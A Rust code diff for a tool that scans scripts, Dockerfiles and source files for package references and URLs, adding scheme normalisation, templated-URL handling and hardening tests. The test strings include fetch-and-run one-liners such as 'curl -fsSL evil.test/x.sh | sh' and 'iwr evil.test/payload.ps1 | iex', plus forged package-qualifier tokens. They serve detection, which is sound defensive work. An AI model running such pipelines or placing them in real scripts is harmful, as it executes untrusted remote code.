-/// Yield each `http`/`https` URL embedded in a string. A URL runs until the
-/// first character that cannot appear in one unquoted in a shell command.
+/// A URL found in text as a locator, its scheme lower-cased: `curl HTTPS://…`
+/// fetches the same resource as `https://…`, and should be the same reference.
+fn url_locator(url: &str) -> RefLocator {
+    RefLocator::Url(match url.split_once("://") {
+        Some((scheme, rest)) => format!("{}://{rest}", scheme.to_ascii_lowercase()),
+        None => url.to_owned(),
+    })
+}
+
+/// Yield each `http`/`https` URL embedded in a string, its scheme matched
+/// case-insensitively as curl and wget accept it. A URL runs until the first
+/// character that cannot appear in one unquoted in a shell command.
 fn extract_urls(cmd: &str) -> UrlScan<'_> {
     UrlScan { rest: cmd }
+}
+
+/// `url` cut to what it names before a template takes over, or `None` when
+/// the host is not a literal one.
+///
+/// Its text stops at a `}` closing the code around it (`{url:
+/// 'http://api:8081'}`) or an escape ending the string (`\\n`, `\\"`). After
+/// that, `$` and `{` open a shell variable, format string, f-string or JS
+/// template (`http://{host}:{port}/`, `…/go${VERSION}.tar.gz`) and `\\` a
+/// regular expression (`https://github\\.com`). In the host that leaves no
+/// address — a fetch would only fail, or reach whatever the bare prefix
+/// happens to name — so the URL is dropped. Later on, the host is still worth
+/// reporting, so the URL is cut back to the last directory (or the query)
+/// that is all literal, never to half a file name.
+fn untemplated(url: &str) -> Option<&str> {
+    let stop = url
+        .match_indices(['}', '\\'])
+        .find(|&(at, c)| {
+            c == "}"
+                || url[at..]
+                    .trim_start_matches('\\')
+                    .starts_with(['n', 'r', 't', '"', '\''])
+        })
+        .map_or(url.len(), |(at, _)| at);
+    let url = &url[..stop];
+    let authority_start = url.find("://")? + 3;
+    let authority_end = url[authority_start..]
+        .find(['/', '?', '#'])
+        .map_or(url.len(), |i| authority_start + i);
+    let syntax = url.find(['$', '{', '\\']).unwrap_or(url.len());
+    if syntax < authority_end
+        || !url[authority_start..authority_end]
+            .chars()
+            .any(char::is_alphanumeric)
+    {
+        return None;
+    }
+    if syntax == url.len() {
+        return Some(url);
+    }
+    let head = &url[..syntax];
+    let keep = match head[authority_end..].find(['?', '#']) {
+        Some(query) => authority_end + query,
+        None => head
+            .rfind('/')
+            .filter(|&slash| slash >= authority_end)
+            .map_or(authority_end, |slash| slash + 1),
+    };
+    Some(&url[..keep])
 }
 
 struct UrlScan<'a> {
@@ -1965,9 +2418,17 @@ impl<'a> Iterator for UrlScan<'a> {
 
     fn next(&mut self) -> Option<&'a str> {
         loop {
-            let start = self.rest.find("http")?;
+            let start = self
+                .rest
+                .as_bytes()
+                .windows(4)
+                .position(|w| w.eq_ignore_ascii_case(b"http"))?;
             let cand = &self.rest[start..];
-            let is_url = cand.starts_with("http://") || cand.starts_with("https://");
+            let prefix = |p: &str| {
+                cand.get(..p.len())
+                    .is_some_and(|c| c.eq_ignore_ascii_case(p))
+            };
+            let is_url = prefix("http://") || prefix("https://");
             if !is_url {
                 self.rest = &cand[4..];
                 continue;
@@ -1981,11 +2442,14 @@ impl<'a> Iterator for UrlScan<'a> {
                         )
                 })
                 .unwrap_or(cand.len());
+            self.rest = &cand[end..];
+            let Some(url) = untemplated(&cand[..end]) else {
+                continue;
+            };
             // Drop the bytes that ended the *text*, not the URL: a shell
             // line-continuation backslash, the punctuation closing a sentence,
             // an empty fragment naming the same resource.
-            let url = cand[..end].trim_end_matches(['\\', '#', '.', ',', ';', ':', '!', '?']);
-            self.rest = &cand[end..];
+            let url = url.trim_end_matches(['\\', '#', '.', ',', ';', ':', '!', '?']);
             if url.len() > "https://".len() {
                 return Some(url);
             }
@@ -3242,5 +3706,370 @@ mod process_alias_tests {
                 "{source}: {refs:?}"
             );
         }
+    }
+}
+
+#[cfg(test)]
+mod hardening_tests {
+    use super::*;
+
+    fn purls(bytes: &[u8], name: &str) -> Vec<String> {
+        references_in_bytes(bytes, name)
+            .into_iter()
+            .filter_map(|r| match r.locator {
+                RefLocator::Purl(p) => Some(p),
+                _ => None,
+            })
+            .collect()
+    }
+
+    fn urls(bytes: &[u8], name: &str) -> Vec<String> {
+        references_in_bytes(bytes, name)
+            .into_iter()
+            .filter_map(|r| match r.locator {
+                RefLocator::Url(u) => Some(u),
+                _ => None,
+            })
+            .collect()
+    }
+
+    fn sorted(mut v: Vec<String>) -> Vec<String> {
+        v.sort();
+        v.dedup();
+        v
+    }
+
+    #[test]
+    fn shell_syntax_around_a_command_is_not_a_package() {
+        let script = b"GEN=$(go install example.test/tool/cmd/gen)\n\
+            go get -u $(go list ./...)\n\
+            go install example.test/quiet@latest 2>/dev/null\n\
+            for pm in apt-get dnf pkg_add port; do echo \"$pm\"; done\n\
+            ruby -e 'Kernel.send(:system, \"bun install wrapped-pkg\")'\n";
+        assert_eq!(
+            sorted(purls(script, "setup.sh")),
+            vec![
+                "pkg:golang/example.test/quiet@latest",
+                "pkg:golang/example.test/tool/cmd/gen",
+                "pkg:npm/wrapped-pkg",
+            ]
+        );
+    }
+
+    #[test]
+    fn a_variable_drops_its_version_or_its_whole_name() {
+        let script = b"go install example.test/kind@v$KIND_VERSION\n\
+            pip install tool==$TOOL_VERSION\n\
+            pacman -S mingw-w64-${arch}-gcc\n\
+            npm i $PKG\n";
+        assert_eq!(
+            sorted(purls(script, "setup.sh")),
+            vec!["pkg:golang/example.test/kind", "pkg:pypi/tool"]
+        );
+    }
+
+    #[test]
+    fn a_go_package_pattern_names_its_path() {
+        assert_eq!(
+            purls(b"go install example.test/x/cmd/...@latest\n", "setup.sh"),
+            vec!["pkg:golang/example.test/x/cmd@latest"]
+        );
+    }
+
+    #[test]
+    fn code_variables_in_a_call_are_not_package_names() {
+        let py = b"import subprocess, sys\n\
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pip_name])\n\
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'literal-pkg'])\n";
+        assert_eq!(purls(py, "guard.py"), vec!["pkg:pypi/literal-pkg"]);
+        let js = b"const cp = require('child_process');\n\
+            cp.execSync('npm install ' + name);\n";
+        assert!(
+            purls(js, "x.js").iter().all(|p| !p.contains("name")),
+            "{:?}",
+            purls(js, "x.js")
+        );
+    }
+
+    #[test]
+    fn templated_urls_keep_only_a_real_host() {
+        let py = b"a = f'http://{host}:{port}/'\n\
+            b = 'http://127.0.0.1:${PORT}/health'\n\
+            c = 'http://198.51.100.7/$path'\n\
+            d = f'http://api.test:8081}'\n\
+            e = 'https://dl.test/go/go${V}.tar.gz'\n\
+            f = r'https://github\\.com/x'\n\
+            f2 = 'https://github\\\\.com\\\\s*$'\n\
+            g = 'https://\xd0\xbf\xd1\x80\xd0\xb8\xd0\xbc\xd0\xb5\xd1\x80.test/a'\n\
+            h = 'http://q.test/search?q=${term}'\n";
+        assert_eq!(
+            sorted(urls(py, "cfg.py")),
+            vec![
+                "http://198.51.100.7/",
+                "http://api.test:8081",
+                "http://q.test/search",
+                "https://dl.test/go/",
+                "https://\u{43f}\u{440}\u{438}\u{43c}\u{435}\u{440}.test/a",
+            ]
+        );
+    }
+
+    #[test]
+    fn deno_run_passes_its_script_arguments_through() {
+        let script = b"deno run main.ts npm:not-a-dep\n\
+            deno run -A npm:runs-this\n\
+            deno run --config deno.json jsr:@scope/runs-too\n";
+        assert_eq!(
+            sorted(purls(script, "run.sh")),
+            vec!["pkg:jsr/%40scope/runs-too", "pkg:npm/runs-this"]
+        );
+    }
+
+    #[test]
+    fn install_tokens_cannot_forge_purl_qualifiers_or_subpaths() {
+        let script = b"npm install foo@1.0?download_url=https:%2F%2Fevil.test%2Fx.tgz\n\
+            gem install bar?checksum=sha256:00\n\
+            pip install baz==1#sub\n\
+            apt-get install qux=1%3Fx\n\
+            npm install plain@1.0\n";
+        assert_eq!(purls(script, "install.sh"), vec!["pkg:npm/plain@1.0"]);
+    }
+
+    #[test]
+    fn evidence_is_clipped_and_references_are_capped() {
+        let mut script = String::from("npm install");
+        for i in 0..2_000 {
+            script.push_str(&format!(" pkg{i}"));
+        }
+        let refs = references_in_bytes(script.as_bytes(), "install.sh");
+        assert_eq!(refs.len(), 2_000);
+        assert!(refs.iter().all(|r| r.evidence.len() <= MAX_EVIDENCE_BYTES));
+        assert!(refs.iter().all(|r| r.offset == Some(0)));
+
+        let mut found = Found::new(Vec::new(), None);
+        for i in 0..MAX_FOUND_REFS + 10 {
+            let locator = RefLocator::Purl(format!("pkg:npm/p{i}"));
+            found.push(locator, RefKind::Command, "test", "npm install");
+        }
+        assert_eq!(found.refs.len(), MAX_FOUND_REFS);
+
+        let wide = "é".repeat(MAX_EVIDENCE_BYTES);
+        assert!(clip(&wide).len() <= MAX_EVIDENCE_BYTES);
+        assert!(wide.starts_with(clip(&wide)));
+    }
+
+    #[test]
+    fn an_invalid_byte_does_not_switch_shell_scanning_off() {
+        let script = b"#!/bin/sh\n# \xff\xfe\nnpm install evil-pkg\n";
+        let refs = references_in_bytes(script, "install.sh");
+        let evil = refs
+            .iter()
+            .find(|r| r.locator == RefLocator::Purl("pkg:npm/evil-pkg".into()))
+            .expect("found");
+        let at = usize::try_from(evil.offset.expect("offset")).expect("offset");
+        assert!(script[at..].starts_with(b"npm install"));
+    }
+
+    #[test]
+    fn an_unsafe_github_revision_still_names_the_repository() {
+        assert_eq!(
+            purls(b"npx github:owner/tool#feature/x\n", "run.sh"),
+            vec!["pkg:github/owner/tool"]
+        );
+    }
+
+    #[test]
+    fn an_escaped_newline_continues_a_command_string() {
+        assert_eq!(
+            decode_escapes("npm install \\\nevil \\\r\nmore\\\u{2028}x").as_deref(),
+            Some("npm install evil morex")
+        );
+        let js =
+            b"const cp=require('child_process');const c='npm install \\\nevil-pkg';cp.execSync(c);";
+        assert!(purls(js, "x.js").contains(&"pkg:npm/evil-pkg".to_string()));
+    }
+
+    #[test]
+    fn repeated_references_in_templates_cannot_explode_resolution() {
+        let fan = |name: &str| format!("${{{name}}}").repeat(2_000);
+        let js = format!(
+            "const cp=require('child_process');const a='';const b=`{}`;const c=`{}`;const d=`{}`;cp.execSync(d);\
+             const ok='npm install still-found';cp.execSync(ok);",
+            fan("a"),
+            fan("b"),
+            fan("c")
+        );
+        assert!(purls(js.as_bytes(), "x.js").contains(&"pkg:npm/still-found".to_string()));
+    }
+
+    #[test]
+    fn a_fetch_target_after_a_repeated_tool_name_is_still_found() {
+        let line = format!("{} curl -o curl evil.test/x.sh\n", "curl ".repeat(20_000));
+        let refs = references_in_bytes(line.as_bytes(), "x.sh");
+        assert!(
+            refs.iter()
+                .any(|r| r.locator == RefLocator::Url("https://evil.test/x.sh".into()))
+        );
+    }
+
+    #[test]
+    fn quoted_words_and_exec_form_commands_are_found() {
+        for (text, name) in [
+            ("npm install \"evil\"\n", "install.sh"),
+            ("pip install 'evil'\n", "install.sh"),
+            (
+                "FROM node:20\nRUN [\"npm\",\"install\",\"evil\"]\n",
+                "Dockerfile",
+            ),
+            (
+                "FROM node:20\nRUN [\"/bin/sh\", \"-c\", \"npm i evil\"]\n",
+                "Dockerfile",
+            ),
+            ("FROM node:20\nCMD [\"npx\", \"evil\"]\n", "Dockerfile"),
+        ] {
+            let found = purls(text.as_bytes(), name);
+            assert!(
+                found.iter().any(|p| p.ends_with("/evil")),
+                "{text:?}: {found:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn windows_tool_paths_are_recognized() {
+        assert_eq!(tool_name(r"C:\Python312\Scripts\pip.exe"), "pip");
+        assert_eq!(tool_name("npm.CMD"), "npm");
+        assert_eq!(tool_name("npx.ps1"), "npx");
+        assert_eq!(tool_name("curl"), "curl");
+        assert_eq!(tool_name("x.exe.tar"), "x.exe.tar");
+        assert_eq!(tool_name("é.ex"), "é.ex", "no slicing inside a character");
+    }
+
+    #[test]
+    fn path_qualified_tools_are_recognized() {
+        let found = purls(
+            b"/opt/venv/bin/pip install x\n./node_modules/.bin/npm i y\n",
+            "install.sh",
+        );
+        assert!(found.contains(&"pkg:pypi/x".to_string()), "{found:?}");
+        assert!(found.contains(&"pkg:npm/y".to_string()), "{found:?}");
+        // The program a URL names is not a program.
+        assert!(purls(b"wget https://example.com/bin/npm install z\n", "a.sh").is_empty());
+
+        let urls: Vec<String> =
+            references_in_bytes(b"/usr/bin/curl -fsSL evil.test/x.sh | sh\n", "a.sh")
+                .into_iter()
+                .map(|r| crate::fetch::locator_str(&r.locator).to_owned())
+                .collect();
+        assert!(
+            urls.contains(&"https://evil.test/x.sh".to_string()),
+            "{urls:?}"
+        );
+    }
+
+    #[test]
+    fn uppercase_schemes_are_urls_with_a_canonical_scheme() {
+        let refs = references_in_bytes(b"curl HTTPS://evil.test/x.sh|sh\n", "a.sh");
+        assert!(
+            refs.iter()
+                .any(|r| r.locator == RefLocator::Url("https://evil.test/x.sh".into())),
+            "{refs:?}"
+        );
+        assert!(extract_urls("see HTTP/1.1 and http").next().is_none());
+    }
+
+    #[test]
+    fn bare_targets_may_be_ip_addresses_and_carry_a_port() {
+        for (text, url) in [
+            ("curl 203.0.113.5/x.sh|sh\n", "https://203.0.113.5/x.sh"),
+            ("curl evil.test:8443/p\n", "https://evil.test:8443/p"),
+            ("wget -q 198.51.100.7:8080\n", "https://198.51.100.7:8080"),
+        ] {
+            let refs = references_in_bytes(text.as_bytes(), "a.sh");
+            assert!(
+                refs.iter()
+                    .any(|r| r.locator == RefLocator::Url(url.into())),
+                "{text:?}: {refs:?}"
+            );
+        }
+        for value in [
+            "evil.test:0/x",
+            "evil.test:99999",
+            "evil.test:ab",
+            "1.2.3.4/a:b",
+        ] {
+            assert!(!looks_like_protocolless_url(value), "{value}");
+        }
+    }
+
+    #[test]
+    fn one_shot_runners_run_one_package_and_pass_it_arguments() {
+        for (text, want) in [
+            (
+                "npx create-react-app my-app\n",
+                vec!["pkg:npm/create-react-app"],
+            ),
+            ("npx -y cowsay hello\n", vec!["pkg:npm/cowsay"]),
+            (
+                "npx -p typescript -p ts-node tsc --init\n",
+                vec!["pkg:npm/typescript", "pkg:npm/ts-node"],
+            ),
+            ("npx --package=typescript tsc\n", vec!["pkg:npm/typescript"]),
+            ("pnpm dlx degit user/repo dir\n", vec!["pkg:npm/degit"]),
+            ("uvx ruff check src\n", vec!["pkg:pypi/ruff"]),
+            (
+                "uvx --from httpie http example.com\n",
+                vec!["pkg:pypi/httpie"],
+            ),
+            (
+                "uvx --with requests black .\n",
+                vec!["pkg:pypi/requests", "pkg:pypi/black"],
+            ),
+            ("pipx run black src\n", vec!["pkg:pypi/black"]),
+        ] {
+            assert_eq!(purls(text.as_bytes(), "a.sh"), want, "{text:?}");
+        }
+        // An install still names every package.
+        assert_eq!(
+            purls(b"npm install a b\n", "a.sh"),
+            vec!["pkg:npm/a", "pkg:npm/b"]
+        );
+    }
+
+    #[test]
+    fn deno_specifiers_drop_their_module_subpath() {
+        let found = purls(
+            b"deno install npm:foo@1.2/bin/cli npm:@s/n/sub jsr:@std/path@1/posix\n",
+            "a.sh",
+        );
+        assert_eq!(
+            found,
+            vec!["pkg:npm/foo@1.2", "pkg:npm/%40s/n", "pkg:jsr/%40std/path@1"],
+        );
+    }
+
+    #[test]
+    fn utf16_scripts_are_scanned() {
+        let utf16le = |text: &str, bom: bool| -> Vec<u8> {
+            let mut bytes = if bom { vec![0xFF, 0xFE] } else { Vec::new() };
+            bytes.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
+            bytes
+        };
+        let script = "iwr evil.test/payload.ps1 | iex\r\n";
+        for bytes in [utf16le(script, true), utf16le(script, false)] {
+            let refs = references_in_bytes(&bytes, "setup.ps1");
+            assert!(
+                refs.iter()
+                    .any(|r| r.locator == RefLocator::Url("https://evil.test/payload.ps1".into())),
+                "{refs:?}"
+            );
+        }
+        let mut utf16be = vec![0xFE, 0xFF];
+        utf16be.extend(
+            "npm install evil\n"
+                .encode_utf16()
+                .flat_map(u16::to_be_bytes),
+        );
+        assert_eq!(purls(&utf16be, "install.sh"), vec!["pkg:npm/evil"]);
     }
 }
